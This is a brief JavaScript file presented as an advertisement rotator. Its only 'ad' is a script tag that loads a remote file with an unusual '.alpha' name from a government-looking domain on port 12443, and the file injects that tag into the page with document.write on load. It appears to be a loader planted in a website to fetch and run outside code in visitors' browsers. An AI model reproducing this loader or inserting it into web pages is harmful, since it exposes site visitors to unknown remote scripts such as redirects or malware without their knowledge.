var randoms = {
	ads_codes: ['<script src="https://www.govkunming.cn:12443/ty/02554552-E837-1889-33-87B117727C8B.alpha"><'+'/script>'],
	ads_weight: [10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();